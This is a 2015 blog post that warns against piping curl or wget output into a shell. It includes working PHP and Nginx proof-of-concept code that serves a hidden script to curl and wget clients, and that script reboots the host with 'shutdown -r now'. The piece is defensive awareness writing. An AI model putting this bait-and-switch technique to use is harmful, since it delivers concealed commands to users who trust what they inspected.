<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="chrome=1"><meta name=HandheldFriendly content="True"><meta name=MobileOptimized content="320"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><meta name=author content="SALVATORE LAMENDOLA (vt0r)"><meta name=description content="Today, we are going to discuss the dangers of sending the output of a curl or wget command directly to your shell. There are already a few examples on why this is dangerous, with a very clear and concise example available here that explains the dangers of connections closing or failing before the transfer is completed. However, I would like to present a much more malicious example. Sinister, even! I call it &ldquo;The Bait-and-Switch."><meta property="og:title" content="Please Stop curl/wget'ing Directly to bash/sh"><meta property="og:description" content="Today, we are going to discuss the dangers of sending the output of a curl or wget command directly to your shell. There are already a few examples on why this is dangerous, with a very clear and concise example available here that explains the dangers of connections closing or failing before the transfer is completed. However, I would like to present a much more malicious example. Sinister, even! I call it &ldquo;The Bait-and-Switch."><meta property="og:type" content="article"><meta property="og:url" content="https://lamendo.la/2015/10/09/please-stop-curl-wgeting-directly-to-bash-sh/"><meta property="article:section" content="blog"><meta property="article:published_time" content="2015-10-09T00:12:03+00:00"><meta property="article:modified_time" content="2015-10-09T00:12:03+00:00"><title>Please Stop curl/wget'ing Directly to bash/sh</title><link rel=canonical href=https://lamendo.la/2015/10/09/please-stop-curl-wgeting-directly-to-bash-sh/><link rel=preload href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Ubuntu+Mono:400,400i,700,700i|Source+Sans+Pro:400&display=swap" as=style onload='this.onload=null,this.rel="stylesheet"'><link rel=stylesheet href=/css/reset.css><link rel=preload href=/css/pygments.css as=style onload='this.onload=null,this.rel="stylesheet"'><link rel=stylesheet href=/css/main.css><link rel="shortcut icon" href=/images/favicon.ico></head><body lang=en><section class=header><div class=container><div class=content><a href=/><img class=avatar src=/images/avatar@2x.png alt=avatar srcset="https://lamendo.la/images/avatar@2x.png 1x"></a>
<a href=/><div class=name>SALVATORE LAMENDOLA (vt0r)</div></a><nav><ul><li class=nav-><a href=https://lamendo.la/about/><span>About</span></a></li><li class=nav-blog><a href=https://lamendo.la/blog/><span>Blog</span></a></li><li class=nav-><a href=https://ip.1a4.fr/ target=_blank rel=noopener><span>What's my IP?</span></a></li><li class=nav-><a href=https://1a4.fr/ target=_blank rel=noopener><span>Encrypted Pastebin</span></a></li></ul></nav></div></div></section><section class=icons><div class=container><div class=content><a href=https://github.com/vt0r target=_blank rel=noopener><img class=icon src=/img/github.svg alt=github></a>
<a href=https://keyoxide.org/4b5fd875f30c8cf39191b11dead217668b7336d5 target=_blank rel=noopener><img class=icon src=/img/keyoxide.svg alt=keyoxide></a>
<a rel=me href=https://noc.social/@vt0r target=_blank><img class=icon src=/img/mastodon.svg alt=mastodon></a>
<a href=https://www.linkedin.com/in/salvatorelamendola target=_blank rel=noopener><img class=icon src=/img/linkedin.svg alt=linkedin></a>
<a href=mailto:salvatore[at@@]lamendo[dot..]la><img class=icon src=/img/email.svg alt=email></a></div></div></section><section class="main post non-narrow zero-top-spacing"><div class=container><div class=content><div class=front-matter><div class=title-container><div class=page-heading>Please Stop curl/wget'ing Directly to bash/sh</div><div class=initials><a href=https://lamendo.la></a></div></div><div class=meta><div class=date title='Fri Oct 9 2015 00:12:03 UTC'>Oct 9, 2015</div><div class=reading-time><div class=middot></div>4 minutes read</div></div></div><div class=markdown><p>Today, we are going to discuss the dangers of sending the output of a curl or wget command directly to your shell. There are already a few examples on why this is dangerous, with a very clear and concise example available <a href=https://www.seancassidy.me/dont-pipe-to-your-shell.html target=_blank>here</a> that explains the dangers of connections closing or failing before the transfer is completed. However, I would like to present a much more malicious example. <em>Sinister, even!</em> I call it &ldquo;The Bait-and-Switch.&rdquo;</p><p>Though this is certainly nothing groundbreaking or even new, this proof of concept is what I hope will end this ridiculous trend of piping downloaded scripts directly to your shell once and for all.</p><p>Take the following URL, for example: <a href=https://1a4.fr/speedtest/ target=_blank>https://1a4.fr/speedtest/</a></p><p>In your browser, the above URL shows a perfectly functional bash script you can use to do some CLI speed tests from DigitalOcean test machines in each of their datacenters. This script will download a 100 MB test file to show basic throughput expectations, and then it will measure the average latency with a series of pings to each test machine. This script by itself is actually quite useful to someone on DigitalOcean or someone considering which datacenter(s) to use in a new setup.</p><p>Now, let&rsquo;s try to grab the same exact URL using <code>curl</code> or <code>wget</code> (but <strong>NOT</strong> piping to bash):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl https://1a4.fr/speedtest/
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget -O- https://1a4.fr/speedtest/
</span></span></code></pre></div><p>What kind of sourcery is this, you ask? Well, let&rsquo;s just go straight into the explanation. Like I mentioned in the introduction, we wanted to show what happens when there&rsquo;s true malicious intent on the server side. To demonstrate this, a friend and I decided to implement two separate proof of concept solutions to achieve the same bait-and-switch end result. We&rsquo;ll first show his example, written in PHP (he has chosen to remain nameless so you don&rsquo;t associate him with PHP):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_USER_AGENT&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$useragent</span> <span class=o>=</span> <span class=nx>strtolower</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_USER_AGENT&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$useragent</span><span class=p>)</span> <span class=o>||</span> <span class=k>empty</span><span class=p>(</span><span class=nv>$useragent</span><span class=p>)</span> <span class=o>||</span> <span class=nx>strpos</span><span class=p>(</span><span class=nv>$useragent</span><span class=p>,</span> <span class=s2>&#34;curl&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span> <span class=o>||</span> <span class=nx>strpos</span><span class=p>(</span><span class=nv>$useragent</span><span class=p>,</span> <span class=s2>&#34;wget&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;#!/bin/sh</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;#</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;# If you are reading this, I fucked up or you pay attention to what you are doing. Friends don&#39;t let friends wget/curl into bash.</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;# They don&#39;t prank them while they&#39;re working on their production networks either, so keep that in mind before you link to someone else.</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;#</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;# If you aren&#39;t reading this... well...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;#</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;# Every host should have shutdown, right? They all run debian and ubuntu anyway...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34; ping -q -s 90 -c 1 speedtest.gparent.org</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;# We don&#39;t care if this works or not. We made our point</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34; shutdown -r now Attention all currently logged-in users - I have shutdown privileges and executed a shell script without reading its source code</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;exit 0 # Exit cleanly. Very important.</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Content-Type: text/plain&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>readfile</span><span class=p>(</span><span class=s2>&#34;./script.sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>As you can see, this is an extremely basic script that will check the user agent string of the browser/client, and if it matches wget, curl or is blank, the malicious script will be presented as the output. Under any other conditions (browsers and some other downloaders that don&rsquo;t rely on wget or curl), the proper script will be presented to your browser, so you can feel all warm and fuzzy about &ldquo;inspecting the source&rdquo; before piping it directly to bash from curl/wget.</p><p>Here&rsquo;s the example I came up with using only Nginx to determine which of two files to serve (one malicious, one not):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-nginx data-lang=nginx><span class=line><span class=cl><span class=c1>## Proof of concept curl|sh bait and switch
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>location</span> <span class=p>~</span> <span class=sr>^/speedtest</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kn>index</span> <span class=s>speedtest.txt</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kn>if</span> <span class=s>(</span><span class=nv>$http_user_agent</span> <span class=s>!~*</span> <span class=s>&#39;curl|wget&#39;)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kn>root</span> <span class=s>/home/speedtest</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kn>root</span> <span class=s>/home/speedtest/malicious</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This example is also quite simple, just like the above PHP version, but it requires only Nginx. To create the necessary directory structure, I created <code>/home/speedtest</code>, which contains <code>speedtest/speedtest.txt</code> and <code>malicious/speedtest/speedtest.txt</code> underneath it. I&rsquo;m sure you can guess which one is the good script and which one is the bad. My example is only matching useragents that contain &lsquo;curl&rsquo; or &lsquo;wget&rsquo; in any case, but leaving any other ones untouched.</p><p>Easy, huh?</p><p>I hope our brief lesson has further implanted into your brain the dangers of piping scripts directly to your shell. Please do your civic duty and tell all your friends to watch out for assholes like myself and my anonymous researcher friend when moving about the interwebs, as you never know when we are out to prove a point (or concept)! We hope you will now at least think twice before piping scripts directly into your shell after downloading, and we&rsquo;d be ecstatic if you <em>STOPPED DOING IT ALTOGETHER, BECAUSE IT&rsquo;S JUST PLAIN STUPID</em>. This concludes our PSA.</p><br><p class=back-to-posts><a href=/blog>Back to posts</a></p></div><br><div class=disqus></div></div></div></section></body></html>